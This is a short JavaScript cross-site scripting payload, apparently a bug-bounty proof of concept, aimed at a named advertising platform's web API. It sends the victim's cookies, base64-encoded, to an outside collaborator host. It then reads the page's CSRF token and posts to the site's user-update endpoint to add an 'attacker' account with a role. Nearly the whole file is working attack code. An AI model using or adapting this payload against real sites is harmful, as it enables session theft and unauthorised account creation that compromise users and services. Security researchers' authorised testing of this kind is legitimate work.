alert(document.cookie);
alert(document.domain);
function stealCookies(){
  const url = 'http://bcrsweta3cja1n7ra673qlbvlmrdf93y.oastify.com/?cookies=' + btoa(document.cookie)
  const response = fetch(url)
}

function getCookie(cname)
{
  var name = cname + "=";
  var ca = document.cookie.split(';');
  for(var i=0; i<ca.length; i++) 
  {
    var c = ca[i].trim();
    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
  }
  return "";
}
stealCookies();

const csrfToken = getCookie("csrftoken");
const addNew = {"name":"attacker","email":"johnstone+attacker' + Math.floor(Math.random() * 1000) + '@wearehackerone.com","role_info_list":[{"type":2}],"operator_type":1};
// a POST request
const response = fetch('https://www.pangleglobal.com/media/api/user/update', {
  method: 'POST',
  headers: {
  'Content-Type': 'application/json; charset=utf-8',
  'X-Csrf-Token':csrfToken
  },
  body: JSON.stringify(addNew),
})
console.log('status:', response.status) 


//finisthed
